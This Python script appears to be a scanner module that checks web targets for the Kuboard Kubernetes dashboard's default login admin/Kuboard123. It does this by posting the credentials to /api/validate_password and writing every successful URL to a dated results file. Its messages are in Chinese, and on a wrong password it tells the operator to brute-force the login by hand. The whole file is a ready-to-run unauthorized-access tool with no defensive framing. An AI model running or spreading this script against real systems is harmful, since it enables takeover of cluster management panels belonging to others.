import requests
import time

import buter

filename = "./reps/Kuboard默认口令-"+str(time.strftime("%Y-%m-%d", time.localtime()))
data = '''{"username":"admin","password":"Kuboard123"}'''
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
        "Content-Type" :"application/json"
    }
poc ='/api/validate_password'
def kdp(url):
    try:
        rep = requests.post(url=url+poc,data=data,headers=headers, verify=False,timeout=3)
        if '"data":"ok"' in rep.text:
            print(buter.colors.GREEN + f"存在Kuboard默认口令 admin/Kuboard123 url : {url}" + buter.colors.END)
            f = open(filename,"a+",encoding="utf-8")
            f.write(url)
            f.write("\n")
            f.close()
        elif '"data":"failed"' in rep.text:
            print(buter.colors.RED+ f"密码错误 请手工爆破 url : {url}" + buter.colors.END)
        else:
            print(buter.colors.END+  f"不存在/账号错误 url : {url}" + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+ f"ERROR : {e}" + buter.colors.END)